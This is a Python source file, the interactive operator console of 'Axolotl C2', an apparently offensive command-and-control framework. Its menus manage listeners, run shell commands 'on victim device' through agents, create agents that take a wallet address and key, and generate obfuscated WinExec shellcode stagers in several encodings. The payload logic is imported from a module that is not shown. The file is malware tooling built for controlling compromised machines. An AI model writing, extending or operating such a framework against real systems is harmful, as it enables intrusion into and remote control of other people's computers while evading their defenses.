import pyfiglet
import sys
from c2Helper import updateAgentsList, listAgents, startListener, sendTask, retrieveTaskResult, listListeners, startStagerListener, generateShellcodeStager, listStagerListener, generateAgent, stopStagerListener
from colorama import Fore
from menu import Menu

HOME = 0
LISTENER = 1
AGENT = 2
STAGER = 3

def manageHome(command, menuList):
    if command == "help":
        menuList[HOME].showHelp()
    elif command == "home":
        main(menuList)
    elif command == "listeners":
        manageListenerMenu(menuList)
    elif command == "agents":
        manageAgentMenu(menuList)
    elif command == "stager":
        manageStagerMenu(menuList)
    elif command == "exit":
        Exit()

def manageListeners(command, args, menuList):
    if command == "help":
        menuList[LISTENER].showHelp()
    elif  command == "home":
        main(menuList)
    elif command == "start":
        if len(args) != 3:
            print("\tYou need to specify name and IP/port where to listen\n")
        else:
            startListener(args)
    elif command == "list":
        print("\tActive listeners\n")
        listListeners()
    elif command == "exit":
        Exit()

def manageAgents(command, args, menuList):
    if command == "help":
        menuList[AGENT].showHelp()
    elif command == "home":
        main(menuList)
    elif command == "list":
        updateAgentsList()
        listAgents()
    elif command == "create":
        if len(args) < 6:
            print("\t Arguments missing.\n")
        else:
            generateAgent(args)
    elif command == "shell":
        if len(args) < 2:
            print("\tYou need to specify the name of agent and the command\n")
        else:
            updateAgentsList()
            sendTask(command, args)
    elif command == "result":
        if len(args) != 1:
            print("\tYou need to specify the name of the agent")
        else:
            retrieveTaskResult(args)
    elif command == "exit":
        Exit()

def manageStager(command, args, menuList):
    if command == "help":
        menuList[STAGER].showHelp()
    elif command == "home":
        main(menuList)
    elif command == "generate-stager":
        if len(args) < 2:
            print("\t Arguments missing !\n")
        else:
            generateShellcodeStager(args)
    elif command == "start":
        if len(args) < 2:
            print("\t Arguments missing !\n")
        else:
            startStagerListener(args)
    elif command == "stop":
        if len(args) < 1:
            print("\t You need to specify the IP !\n")
        else:
            stopStagerListener(args)
    elif command == "list":
        listStagerListener()

def Exit():
    sys.exit()

def printWelcome():
    ascii = pyfiglet.figlet_format('Axolotl', font='cosmike')
    print(Fore.RED + ascii)
    print("\t=== Welcome to Axolotl C2 ===\n")
    print("Type help to show commands option\n")
    print(Fore.WHITE)

def manageAgentMenu(menuList):
    while True:
        try:
            command, args = menuList[AGENT].parseCmd()
        except:
            continue
        if command in menuList[AGENT].commands:
            manageAgents(command, args, menuList)

def manageListenerMenu(menuList):
    while True:
        try:
            command, args = menuList[LISTENER].parseCmd()
        except:
            continue
        if command in menuList[LISTENER].commands:
            manageListeners(command, args, menuList)

def manageStagerMenu(menuList):
    while True:
        try:
            command, args = menuList[STAGER].parseCmd()
        except:
            continue
        if command in menuList[STAGER].commands:
            manageStager(command, args, menuList)

def initCLI():
    MainMenu = Menu("Main")
    MainMenu.registerCmd("listeners", "Manage listeners.", "")
    MainMenu.registerCmd("agents", "Manage agents.", "")
    MainMenu.registerCmd("stager", "Manage stager.", "")
    MainMenu.registerCmd("help", "Show help.", "")
    MainMenu.registerCmd("exit", "Quit Axolotl C2.", "")
    ListenerMenu = Menu("Listeners")
    ListenerMenu.registerCmd("start", "Start a listener.", "<name> <ip> <port>")
    ListenerMenu.registerCmd("list", "List running listeners.", "")
    ListenerMenu.registerCmd("home", "Return to main menu.", "")
    ListenerMenu.registerCmd("help", "Show help.", "")
    ListenerMenu.registerCmd("exit", "Quit Axolotl C2.", "")
    AgentMenu = Menu("Agents")
    AgentMenu.registerCmd("shell", "Execute command on victim device.", "<agent_name> <command>")
    AgentMenu.registerCmd("list", "list agents.", "")
    AgentMenu.registerCmd("create", "Create python agent.", "<name> <ip> <port> <wallet_addr> <key> <save_path>")
    AgentMenu.registerCmd("home", "Return to main menu.", "")
    AgentMenu.registerCmd("help", "Show help.", "")
    AgentMenu.registerCmd("exit", "Quit Axolotl C2.", "")
    AgentMenu.registerCmd("result", "Show result of the task.", "<agent>")
    StagerMenu = Menu("Stager")
    StagerMenu.registerCmd("generate-stager", "Generate a stager shellcode that use WinExec.", "<command> <encode|python|nim|c#|xor> <xor_key>")
    StagerMenu.registerCmd("start", "Start a stager listener.", "<ip> <port> opt:<custom_agent_path>")
    StagerMenu.registerCmd("stop", "Stop the stager listener.", "<ip>")
    StagerMenu.registerCmd("list", "List stager listener.", "")
    StagerMenu.registerCmd("help", "Show help.", "")
    StagerMenu.registerCmd("home", "Return to main menu.", "")

    return [MainMenu, ListenerMenu, AgentMenu, StagerMenu]

def main(menuList):
    while True:
        command, args = menuList[HOME].parseCmd()
        if command in menuList[HOME].commands:
            manageHome(command, menuList)


if __name__ == '__main__':
    menuList = initCLI()
    printWelcome()
    main(menuList)
